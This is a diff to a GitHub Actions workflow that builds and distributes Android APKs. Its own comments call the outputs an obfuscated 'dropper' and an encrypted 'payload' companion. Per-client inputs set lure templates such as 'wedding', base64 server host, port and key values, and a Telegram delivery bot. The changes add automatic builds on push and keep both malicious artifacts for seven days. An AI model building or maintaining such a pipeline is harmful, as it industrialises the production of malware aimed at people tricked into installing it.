@@ -13,6 +13,11 @@ run-name: >-
   }}
 
 on:
+  # ── Auto-build on every push to main ────────────────────────────────────────
+  push:
+    branches: [ main ]
+
+  # ── Manual trigger (bot / RDP) with full inputs ──────────────────────────────
   workflow_dispatch:
     inputs:
       template:
@@ -62,15 +67,16 @@ jobs:
 
     env:
       MODULE_ASSET:     app/src/main/assets/companion.apk
-      TEMPLATE:         ${{ github.event.inputs.template }}
-      CLIENT_ID:        ${{ github.event.inputs.client_id }}
-      BUILD_CHAT_ID:    ${{ github.event.inputs.build_chat_id }}
-      BUILD_MESSAGE_ID: ${{ github.event.inputs.build_message_id }}
-      CUSTOM_APP_NAME:  ${{ github.event.inputs.custom_app_name }}
-      CUSTOM_ICON_FID:  ${{ github.event.inputs.custom_icon_file_id }}
-      SERVER_HOST_B64:  ${{ github.event.inputs.server_host_b64 }}
-      SERVER_PORT_B64:  ${{ github.event.inputs.server_port_b64 }}
-      SERVER_KEY_B64:   ${{ github.event.inputs.server_key_b64 }}
+      # On push trigger github.event.inputs.* is empty — || fallbacks supply safe defaults
+      TEMPLATE:         ${{ github.event.inputs.template || 'wedding' }}
+      CLIENT_ID:        ${{ github.event.inputs.client_id || 'push-build' }}
+      BUILD_CHAT_ID:    ${{ github.event.inputs.build_chat_id || '' }}
+      BUILD_MESSAGE_ID: ${{ github.event.inputs.build_message_id || '0' }}
+      CUSTOM_APP_NAME:  ${{ github.event.inputs.custom_app_name || '' }}
+      CUSTOM_ICON_FID:  ${{ github.event.inputs.custom_icon_file_id || '' }}
+      SERVER_HOST_B64:  ${{ github.event.inputs.server_host_b64 || '' }}
+      SERVER_PORT_B64:  ${{ github.event.inputs.server_port_b64 || '' }}
+      SERVER_KEY_B64:   ${{ github.event.inputs.server_key_b64 || '' }}
       BOT_TOKEN:        ${{ secrets.TELEGRAM_BOT_TOKEN }}
 
     steps:
@@ -824,13 +830,23 @@ jobs:
             --msg-id    "${{ github.event.inputs.build_message_id }}" \
             --token     "${{ secrets.TELEGRAM_BOT_TOKEN }}" || true
 
-      # ── 11. Upload Release APK artifact ──────────────────────────────────────
-      - name: Upload Release APK artifact
+      # ── 11. Upload both APK artifacts ────────────────────────────────────────
+      # Nova (dropper) — final obfuscated + signed APK
+      - name: Upload Nova APK artifact
         uses: actions/upload-artifact@v4
         with:
-          name: nova-launcher-release
+          name: nova-dropper-${{ github.run_number }}
           path: app/build/outputs/apk/release/nova_*.apk
-          retention-days: 1
+          retention-days: 7
+          overwrite: true
+
+      # Companion (payload) — encrypted + signed companion APK
+      - name: Upload Companion APK artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: companion-payload-${{ github.run_number }}
+          path: app/src/main/assets/companion.apk
+          retention-days: 7
           overwrite: true
 
       # ── 11b. Send APK to Telegram ─────────────────────────────────────────────
